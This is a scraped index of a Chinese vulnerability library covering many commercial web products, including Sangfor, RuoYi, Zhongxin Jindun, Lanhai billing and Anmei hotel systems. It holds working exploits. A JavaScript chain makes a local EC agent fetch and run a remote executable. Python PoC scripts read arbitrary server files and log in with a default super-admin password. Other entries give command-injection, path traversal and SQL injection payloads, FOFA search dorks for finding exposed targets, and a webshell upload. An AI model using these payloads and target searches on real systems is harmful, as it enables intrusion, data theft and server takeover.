BaseHTTPServer.HTTPServer(('0.0.0.0', 8000), Handler) httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True) httpd.serve_forever() 最终如上脚本支持POST方法，当时用POST方法请求时即返回文件内容。 最后，拖一个calc.exe（计算器）到HTTPS网站根目录下的/com/win/XXXUD.exe。 依次请求（经过多次复现发现，这三个请求才是重点的，其他的可以忽略）： https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=172.20.10.2 8000&callback=EA_cb10000 https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&token=50065256e83ff1bb9e01757d0d22b669&callback=EA_cb10003 https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&callback=EA_cb10005 会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器： Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可： // 服务器IP和端口 var ip = \"172.20.10.2\"; var port = \"4443\"; var poc_list = [\"https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=\" + ip + \" \" + port + \"&Guid=&callback=EA_cb10000\", \"https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&token=c4202416e283e60809d3b1e04e4bae6b&Guid=&callback=EA_cb10003\", \"https://127.0.0.1:54530/ECAgent/?op=UpdateControls&arg1=BEFORELOGIN&Guid=&callback=EA_cb10005\"]; for(var i=0; i 其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的/com/win/目录下有一个XXXUD.exe文件。 参考文章 https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/深信服 日志中心 c.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/深信服/深信服 日志中心 c.php 远程命令执行漏洞.html","title":"深信服 日志中心 c.php 远程命令执行漏洞","keywords":"","body":"深信服 日志中心 c.php 远程命令执行漏洞 漏洞描述 深信服 日志中心 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行 漏洞影响 [!NOTE] 深信服 日志中心 FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" 漏洞复现 登录页面如下 访问漏洞Url /tool/log/c.php?strip_slashes=system&host=ipconfig 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/深信服 行为感知系统 c.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/深信服/深信服 行为感知系统 c.php 远程命令执行漏洞.html","title":"深信服 行为感知系统 c.php 远程命令执行漏洞","keywords":"","body":"深信服 行为感知系统 c.php 远程命令执行漏洞 漏洞描述 深信服 行为感知系统 c.php 远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行 漏洞影响 [!NOTE] 深信服 行为感知系统 FOFA [!NOTE] body=\"isHighPerformance : !!SFIsHighPerformance,\" 漏洞复现 登录页面如下 访问漏洞Url /tool/log/c.php?strip_slashes=system&host=ipconfig 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/深信服/深信服后台任意用户登陆漏洞.html":{"url":"book/Web应用漏洞/深信服/深信服后台任意用户登陆漏洞.html","title":"深信服后台任意用户登陆漏洞","keywords":"","body":"深信服后台任意用户登陆漏洞 漏洞描述 深信服终端检测响应平台是深信服公司开发的一套EDR系统。攻击者利用该漏洞，登录任意用户 影响版本 [!NOTE] EDR 漏洞复现 https://xxx.xxx.xxx.xxx/ui/login.php?user=admin [!NOTE] 注意最后的admin需要为存在的用户名 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/若依管理系统/":{"url":"book/Web应用漏洞/若依管理系统/","title":"若依(RuoYi)管理系统","keywords":"","body":"若依(RuoYi)管理系统 若依管理系统 后台任意文件读取 CNVD-2021-01931 若依管理系统 未授权访问 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/若依管理系统/若依管理系统 后台任意文件读取 CNVD-2021-01931.html":{"url":"book/Web应用漏洞/若依管理系统/若依管理系统 后台任意文件读取 CNVD-2021-01931.html","title":"若依管理系统 后台任意文件读取 CNVD-2021-01931","keywords":"","body":"若依(RuoYi)管理系统 后台任意文件读取 漏洞描述 若依管理系统是基于SpringBoot的权限管理系统,登录后台后可以读取服务器上的任意文件 漏洞影响 [!NOTE] RuoYi FOFA [!NOTE] app=\"若依-管理系统\" 漏洞复现 登录后台后访问 Url https://xxx.xxx.xxx.xxx/common/download/resource?resource=/profile/../../../../etc/passwd 访问后会下载文件 /etc/passwd 可以使用Burp抓包改变 /etc/passwd 为其他文件路径获取敏感信息 在新版本的修复中添加了过滤 漏洞利用POC [!NOTE] POC使用需要后台的Cookie,读取的文件路径应为根路径 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: RuoYi >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> JSESSIONID=xxxxxx \\033[0m') print('+ \\033[36mFile >>> /etc/passwd \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../etc/passwd\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}//common/download/resource?resource=/profile/../../../../etc/passwd \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Filename = input(\"\\033[35mFile >>> \\033[0m\") if Filename == \"exit\": sys.exit(0) else: POC_2(target_url, Cookie, Filename) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie, Filename): vuln_url = target_url + \"/common/download/resource?resource=/profile/../../../../{}\".format(Filename) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":Cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = str(input(\"\\033[35mCookie >>> \\033[0m\")) POC_1(target_url, Cookie) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/若依管理系统/若依管理系统 未授权访问.html":{"url":"book/Web应用漏洞/若依管理系统/若依管理系统 未授权访问.html","title":"若依管理系统 未授权访问","keywords":"","body":"若依管理系统 未授权访问 漏洞描述 若依管理系统使用了Druid 默认开启了匿名访问，导致未授权获取敏感信息 漏洞影响 [!NOTE] 若依管理系统 FOFA [!NOTE] app=\"若依-管理系统\" 漏洞复现 源码中看到 pom.xml 文件中查看到引用了 阿里Druid 从 issues 中发现了默认存在的未授权访问 Url为 http://xxx.xxx.xxx.xxx/prod-api/druid/index.html Goby & POC [!NOTE] RuoYi Druid Unauthorized access 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/智慧校园管理系统/":{"url":"book/Web应用漏洞/智慧校园管理系统/","title":"智慧校园管理系统","keywords":"","body":"智慧校园管理系统 智慧校园管理系统 前台任意文件上传漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/智慧校园管理系统/智慧校园管理系统 前台任意文件上传漏洞.html":{"url":"book/Web应用漏洞/智慧校园管理系统/智慧校园管理系统 前台任意文件上传漏洞.html","title":"智慧校园管理系统 前台任意文件上传漏洞","keywords":"","body":"智慧校园管理系统 前台任意文件上传漏洞 漏洞描述 智慧校园管理系统前台注册页面存在文件上传，由于没有对上传的文件进行审查导致可上传恶意文件控制服务器 漏洞影响 [!NOTE] 智慧校园管理系统 FOFA [!NOTE] body=\"DC_Login/QYSignUp\" 漏洞复现 登录页面如下，只要存在企业用户注册就可能出现漏洞 [!NOTE] 这个地方的上传附件允许了任意文件上传，包括 aspx木马，上传后还会返回 webshell地址 上传的是冰蝎木马，直接连接 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中新金盾/":{"url":"book/Web应用漏洞/中新金盾/","title":"中新金盾","keywords":"","body":"中新金盾 中新金盾信息安全管理系统 默认超级管理员密码漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/中新金盾/中新金盾信息安全管理系统 默认超级管理员密码漏洞.html":{"url":"book/Web应用漏洞/中新金盾/中新金盾信息安全管理系统 默认超级管理员密码漏洞.html","title":"中新金盾信息安全管理系统 默认超级管理员密码漏洞","keywords":"","body":"中新金盾信息安全管理系统 默认超级管理员密码漏洞 漏洞描述 中新网络信息安全股份有限公司中新金盾信息安全管理系统存在默认弱口令，登录身份为超级管理员 目前大部分使用的都受到了影响 漏洞影响 [!NOTE] 中新金盾信息安全管理系统 FOFA [!NOTE] title=\"中新金盾信息安全管理系统\" 漏洞复现 看到产品手册 系统默认管理员账号密码： admin/zxsoft1234!@#$ 登录页面如上，使用账号密码登录 其中泄露了大部分信息，其中包括 SMMS与FTP 及用户信息 漏洞利用POC [!NOTE] 请求 ?q=common/getcode 时 返回了验证码，通过验证码可爆破账号密码等操作 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 中新金盾信息安全管理系统 默认超级管理员密码漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在获取验证码 {}?q=common/getcode ..... \\033[0m\".format(target_url)) response_data = response.headers['Set-Cookie'] check_code = re.findall(r'check_code=(.*?);', response_data)[0] PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0] print(\"\\033[36m[o] 验证码:{}\\n[o] PHPSESSID:{} \\033[0m\".format(check_code, PHPSESSID)) POC_2(target_url, check_code, PHPSESSID) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, check_code, PHPSESSID): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"PHPSESSID={}; check_code={}\".format(PHPSESSID, check_code), \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234!%40%23%24&checkcode={}&doLoginSubmit=1\".format(check_code) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"1\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在默认管理员弱口令 admin / zxsoft1234!@#$ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 ZhongXinJingDun_Default_administrator_password 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/图创软件/":{"url":"book/Web应用漏洞/图创软件/","title":"图创软件","keywords":"","body":"图创软件 图创软件 图书馆站群管理系统 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/图创软件/图创软件 图书馆站群管理系统 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/图创软件/图创软件 图书馆站群管理系统 任意文件读取漏洞.html","title":"图创软件 图书馆站群管理系统 任意文件读取漏洞","keywords":"","body":"图创软件 图书馆站群管理系统 任意文件读取漏洞 漏洞描述 图创软件 图书馆站群管理系统 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 漏洞影响 [!NOTE] 图创软件 图书馆站群管理系统 FOFA [!NOTE] \"广州图创\" && country=\"CN\" && body=\"/interlib/common/\" 漏洞复现 登录页面如下 漏洞请求包为 GET /interlib/report/ShowImage?localPath=C:\\Windows\\system.ini HTTP/1.1 Host: Content-Length: 4 成功读取 system.ini 文件 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/久其软件/":{"url":"book/Web应用漏洞/久其软件/","title":"久其软件","keywords":"","body":"久其软件 久其财务报表 download.jsp 任意文件读取漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/久其软件/久其财务报表 download.jsp 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/久其软件/久其财务报表 download.jsp 任意文件读取漏洞.html","title":"久其财务报表 download.jsp 任意文件读取漏洞","keywords":"","body":"久其财务报表 download.jsp 任意文件读取漏洞 漏洞描述 久其财务报表 download.jsp 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的信息 漏洞影响 [!NOTE] 久其财务报表 FOFA [!NOTE] body=\"/netrep/\" 漏洞复现 登录路径如下 发送请求包 POST /netrep/ebook/browse/download.jsp HTTP/1.1 Host: Content-Length: 55 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://114.251.113.53:7002 Content-Type: application/x-www-form-urlencoded jpgfilepath=c:\\windows\\win.ini 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/心理测量平台/":{"url":"book/Web应用漏洞/心理测量平台/","title":"心理测量平台","keywords":"","body":"心理测量平台 安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/心理测量平台/安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929.html":{"url":"book/Web应用漏洞/心理测量平台/安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929.html","title":"安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929","keywords":"","body":"安徽阳光心健 心理测量平台 目录遍历漏洞 CNVD-2021-01929 漏洞描述 安徽阳光心健心理咨询有限公司心理测量平台存在目录遍历漏洞，攻击者可利用该漏洞获取敏感信息。 漏洞影响 [!NOTE] 安徽阳光心健 心理测量平台 FOFA [!NOTE] icon_hash=\"-320896955\" 漏洞复现 主页如下 扫描目录 访问 http://xxx.xxx.xxx.xxx/admin/ 其中 http://xxx.xxx.xxx.xxx/admin/UserFiles/ 中还包含了用户信息可未授权下载 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/实践教学平台/":{"url":"book/Web应用漏洞/实践教学平台/","title":"实践教学平台","keywords":"","body":"实践教学平台 杭州法源软件 法律知识数据库系统 SQL注入漏洞 杭州法源软件 法律知识数据库系统 后台XSS漏洞 杭州法源软件 公证实务教学软件 SQL注入漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/实践教学平台/杭州法源软件 法律知识数据库系统 SQL注入漏洞.html":{"url":"book/Web应用漏洞/实践教学平台/杭州法源软件 法律知识数据库系统 SQL注入漏洞.html","title":"杭州法源软件 法律知识数据库系统 SQL注入漏洞","keywords":"","body":"杭州法源软件 法律知识数据库系统 SQL注入漏洞 漏洞描述 杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录前台存在通用SQLi漏洞 漏洞影响 [!NOTE] 杭州法源软件 法律知识数据库系统 FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"实践教学平台 - 杭州法源软件开发有限公司\" 漏洞复现 进入页面如下 出现漏洞的Url为 http://xxxxxxx/JusRepos/ui/login.aspx 抓取登录的请求包 POST /JusRepos/ui/login.aspx HTTP/1.1 Host: xxx.xxx.xxx.xxxx Content-Length: 362 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95 其中注入的参数为 POST数据中的 txtUser 参数, 保存为文件使用 Sqlmap跑一下 sqlmap -r sql.txt -p txtUser 同时还存在着万能密码可以直接登录后台 user: 1' or 1=1 -- pass: peiqi 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/实践教学平台/杭州法源软件 法律知识数据库系统 后台XSS漏洞.html":{"url":"book/Web应用漏洞/实践教学平台/杭州法源软件 法律知识数据库系统 后台XSS漏洞.html","title":"杭州法源软件 法律知识数据库系统 后台XSS漏洞","keywords":"","body":"杭州法源软件 法律知识数据库系统 后台XSS漏洞 漏洞描述 杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录后台用户名处存在通用XSS漏洞 漏洞影响 [!NOTE] 杭州法源软件 法律知识数据库系统 FOFA [!NOTE] icon_hash=\"2018105215\" || title=\"实践教学平台 - 杭州法源软件开发有限公司\" 漏洞复现 登录后台后更改用户名，使用 td标签 闭合 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/实践教学平台/杭州法源软件 公证实务教学软件 SQL注入漏洞.html":{"url":"book/Web应用漏洞/实践教学平台/杭州法源软件 公证实务教学软件 SQL注入漏洞.html","title":"杭州法源软件 公证实务教学软件 SQL注入漏洞","keywords":"","body":"杭州法源软件 公证实务教学软件 SQL注入漏洞 漏洞描述 杭州法源软件 公证实务教学软件 存在SQL注入漏洞 漏洞影响 [!NOTE] 杭州法源软件 公证实务教学软件 FOFA [!NOTE] FOFA暂时未收录任何网站 漏洞复现 登录页面如下 登录抓取请求包 POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D&__VIEWSTATEGENERATOR=1B0004A3&txtName=123&txtPwd=123&btnSubmit=+ 其中注入的参数为 POST数据中的 txtName 参数, 保存为文件使用 Sqlmap跑一下 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/银澎云计算/":{"url":"book/Web应用漏洞/银澎云计算/","title":"银澎云计算","keywords":"","body":"银澎云计算 银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/银澎云计算/银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437.html":{"url":"book/Web应用漏洞/银澎云计算/银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437.html","title":"银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437","keywords":"","body":"银澎云计算 好视通视频会议系统 任意文件下载 漏洞描述 银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息 漏洞影响 [!NOTE] 银澎云计算 好视通视频会议系统 FOFA [!NOTE] app=\"Hanming-Video-Conferencing\" 漏洞复现 登录页面如下 漏洞Url为 https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Yinpeng_Hanming_Video_Conferencing__Arbitrary_file_read.json 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/默安/":{"url":"book/Web应用漏洞/默安/","title":"默安","keywords":"","body":"默安 默安 幻阵蜜罐未授权访问 RCE 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/默安/默安 幻阵蜜罐未授权访问 RCE.html":{"url":"book/Web应用漏洞/默安/默安 幻阵蜜罐未授权访问 RCE.html","title":"默安 幻阵蜜罐未授权访问 RCE","keywords":"","body":"默安 幻阵蜜罐未授权访问 RCE 漏洞描述 默安 幻阵蜜罐存在部署页面未授权访问 ，可执行任意命令 漏洞影响 [!NOTE] 默安 幻阵蜜罐 漏洞复现 产品页面 安装页面如下 默安 幻阵蜜罐 刷新并抓包 Drop掉 /huanzhen/have_installed? 进入页面 点击调试抓包 执行其他命令 点击一键诊断泄露 IP数据 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/星锐蓝海/":{"url":"book/Web应用漏洞/星锐蓝海/","title":"星锐蓝海","keywords":"","body":"星锐蓝海 蓝海卓越计费管理系统 download.php 任意文件读取漏洞 蓝海卓越计费管理系统 debug.php 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/星锐蓝海/蓝海卓越计费管理系统 download.php 任意文件读取漏洞.html":{"url":"book/Web应用漏洞/星锐蓝海/蓝海卓越计费管理系统 download.php 任意文件读取漏洞.html","title":"蓝海卓越计费管理系统 download.php 任意文件读取漏洞","keywords":"","body":"蓝海卓越计费管理系统 download.php 任意文件读取漏洞 漏洞描述 蓝海卓越计费管理系统 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件 漏洞影响 [!NOTE] 蓝海卓越计费管理系统 FOFA [!NOTE] title==\"蓝海卓越计费管理系统\" 漏洞复现 登录页面如下 出现漏洞的文件为 download.php ，其中 file参数 存在用户可控 发送如下请求包 GET /download.php?file=../../../../../etc/passwd HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=qkoqsiilc4dol8s4e9d7ta15g7; mylang=zh_s Connection: close Goby & POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/星锐蓝海/蓝海卓越计费管理系统 debug.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/星锐蓝海/蓝海卓越计费管理系统 debug.php 远程命令执行漏洞.html","title":"蓝海卓越计费管理系统 debug.php 远程命令执行漏洞","keywords":"","body":"蓝海卓越计费管理系统 debug.php 远程命令执行漏洞 漏洞描述 蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行 漏洞影响 [!NOTE] 蓝海卓越计费管理系统 FOFA [!NOTE] title==\"蓝海卓越计费管理系统\" 漏洞复现 登录页面如下 漏洞代码 访问 debug.php页面 远程调试命令执行 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/安美数字/":{"url":"book/Web应用漏洞/安美数字/","title":"安美数字","keywords":"","body":"安美数字 安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web应用漏洞/安美数字/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞.html":{"url":"book/Web应用漏洞/安美数字/安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞.html","title":"安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞","keywords":"","body":"安美数字 酒店宽带运营系统 server_ping.php 远程命令执行漏洞 漏洞描述 安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行 漏洞影响 [!NOTE] 安美数字 酒店宽带运营系统 FOFA [!NOTE] \"酒店宽带运营\" 漏洞复现 登录页面如下 存在漏洞的文件为 server_ping.php \\n\"; echo \"parent.doTestResult('$id', 'ok');\\n\"; echo \"\\n\"; } else { echo \"\\n\"; echo \"parent.doTestResult('$id', 'no');\\n\"; echo \"\\n\"; } ?> 漏洞位置为 $cmd = \"ping -c 2 -s 65 $ip\"; $fp = popen($cmd, \"r\"); GET传入 $ip参数 后直接命令执行，并且文件无权限要求 请求包为 GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../test.txt&id=1 HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 